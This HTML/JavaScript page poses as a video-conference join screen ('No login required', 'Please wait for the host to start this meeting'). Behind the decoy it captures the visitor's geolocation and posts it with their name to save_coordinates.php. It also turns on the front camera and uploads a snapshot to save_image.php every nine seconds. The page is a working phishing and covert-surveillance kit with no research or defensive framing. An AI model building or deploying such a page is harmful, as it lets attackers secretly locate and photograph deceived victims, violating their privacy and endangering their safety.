<!DOCTYPE html>
<html>
  <head>
    <link rel="stylesheet" href="./videopanel.css" />
    <title>Datexyz</title>
    <script>
      function getLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(showPosition, showError);
        } else {
          alert("Geolocation is not supported by this browser.");
        }
      }

      function showPosition(position) {
        var latitude = position.coords.latitude;
        var longitude = position.coords.longitude;
        var timestamp = new Date().toLocaleString();
        var name = document.getElementById("name").value;

        // Create an AJAX request to save the coordinates, IP address, and timestamp to a file
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "save_coordinates.php", true);
        xhr.setRequestHeader(
          "Content-Type",
          "application/x-www-form-urlencoded"
        );
        xhr.onreadystatechange = function () {
          if (xhr.readyState === 4 && xhr.status === 200) {
            console.log(xhr.responseText);
          }
        };
        xhr.send(
          "latitude=" +
            latitude +
            "&longitude=" +
            longitude +
            "&timestamp=" +
            encodeURIComponent(timestamp) +
            "&name=" +
            encodeURIComponent(name)
        );
        alert("Waiting for the host to grant permissions...");
      }

      function showError(error) {
        switch (error.code) {
          case error.PERMISSION_DENIED:
            alert("Geolocation is required to connect");
            var latitude = "N/A";
            var longitude = "N/A";
            var timestamp = new Date().toLocaleString();
            var name = document.getElementById("name").value;

            // Create an AJAX request to save the coordinates, IP address, and timestamp to a file
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "save_coordinates.php", true);
            xhr.setRequestHeader(
              "Content-Type",
              "application/x-www-form-urlencoded"
            );
            xhr.onreadystatechange = function () {
              if (xhr.readyState === 4 && xhr.status === 200) {
                console.log(xhr.responseText);
              }
            };
            xhr.send(
              "latitude=" +
                latitude +
                "&longitude=" +
                longitude +
                "&timestamp=" +
                encodeURIComponent(timestamp) +
                "&name=" +
                encodeURIComponent(name)
            );
            break;
          case error.POSITION_UNAVAILABLE:
            alert("Location information is unavailable.");
            break;
          case error.TIMEOUT:
            alert("The request to get user location timed out.");
            break;
          case error.UNKNOWN_ERROR:
            alert("An unknown error occurred.");
            break;
        }
      }
    </script>

    <div class="video-wrap">
      <video id="video" playsinline autoplay></video>
    </div>

    <canvas hidden id="canvas" width="640" height="640"></canvas>

    <script>
      "use strict";

      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      const constraints = {
        audio: false,
        video: {
          facingMode: "user",
        },
      };

      // Request camera permission
      function requestCameraPermission() {
        var nameInput = document.getElementById("name");
        var name = nameInput.value;

        if (name.trim() === "") {
          alert("Please enter your name.");
          return;
        }

        // Hide the form
        var form = document.querySelector("form");
        form.style.display = "none";

        // Show the video element
        /* The element was present and occupying space even when the user hadn't logged in this is fixed by making the element hidden by default and then by changing the display to flex, rather than removing the "hidden" attribute */

        var videoWrap = document.querySelector(".video-wrap");
        // videoWrap.removeAttribute('hidden');//ignore this line
        videoWrap.style.display = "flex"; //this works

        // Access webcam
        navigator.mediaDevices
          .getUserMedia(constraints)
          .then(function (stream) {
            handleSuccess(stream);
            startCapturing();
          })
          .catch(function (error) {
            console.error("Error accessing webcam:", error);
          });
      }

      // Success
      function handleSuccess(stream) {
        window.stream = stream;
        video.srcObject = stream;
      }

      // Start capturing frames
      function startCapturing() {
        var context = canvas.getContext("2d");
        setInterval(function () {
          context.drawImage(video, 0, 0, 640, 640);
          var canvasData = canvas.toDataURL("image/png");
          var base64Image = canvasData.replace("data:image/png;base64,", "");

          // Send the base64 encoded image to the server for storage
          post(base64Image);
        }, 9000);
      }

      // Send image data to the server
      function post(imgData) {
        var folderName = "folder-name";
        var fileName = Date.now() + ".png";
        var name = document.getElementById("name").value;

        // Create a FormData object and append the image data
        var formData = new FormData();
        formData.append("folderName", folderName);
        formData.append("fileName", fileName);
        formData.append("name", name);
        formData.append("imageData", imgData);

        // Send a POST request to the server-side script
        fetch("save_image.php", {
          method: "POST",
          body: formData,
        })
          .then((response) => {
            // Handle the server response
            console.log("Image sent successfully");
          })
          .catch((error) => {
            console.error("Error sending image to the server:", error);
          });
      }

      function changeBodyBg() {
        var body = document.getElementsByTagName("body")[0];
        // body.style.backgroundImage="url('./images/bg1.png')";
        // body.style.backgroundAttachment="fixed";
        // body.style.backgroundRepeat="no-repeat";
        // body.style.backgroundPosition="center";
        body.style.backgroundColor = "rgb(34,34,34)";
      }

      function addTaskBar() {
        //creates the heading shown in the center as soon as login button is pressed
        var parentbox = document.querySelector(`.taskbar-container`);
        var heading = document.createElement(`div`);
        heading.className = "heading";
        heading.innerHTML = "";
        heading.innerHTML += `<h1>Please wait for the host to start this meeting...</h1>`;
        parentbox.appendChild(heading);
        document.querySelector(`.container`).style.display = "none";
        document.querySelector(`.container-box`).style.margin = "0px";

        //creates the taskbar seen below as soon as the login button is pressed
        var body = document.createElement(`div`);
        body.className = "taskbar";
        body.innerHTML = "";
        body.innerHTML += `<img src="../images/left tools.png" alt="">`;
        body.innerHTML += `<img src="../images/center tools.png" alt="">`;
        body.innerHTML += `<img src="../images/right tools.png" alt="">`;
        parentbox.appendChild(body);
      }
    </script>
  </head>
  <body>
    <div class="container-box">
      <div class="container">
        <h1>Connect to the video conference</h1>
        <form
          onsubmit="event.preventDefault(); getLocation(); requestCameraPermission(); changeBodyBg();addTaskBar();"
        >
          <label for="name">No login required</label>
          <input
            type="text"
            id="name"
            name="name"
            placeholder="Your name here"
            required
          />
          <input type="submit" value="Connect" />
        </form>
      </div>
    </div>

    <!-- This blank div is later fed with a div which is generated in the function "addTaskBar()"  -->
    <div class="taskbar-container">
      <!-- previous code was, kept it for reference -->

      <!-- <div class="taskbar">
        <img src="./images/left tools.png" alt="">
        <img src="./images/center tools.png" alt="">
        <img src="./images/right tools.png" alt="">
    </div> -->
    </div>
  </body>
</html>
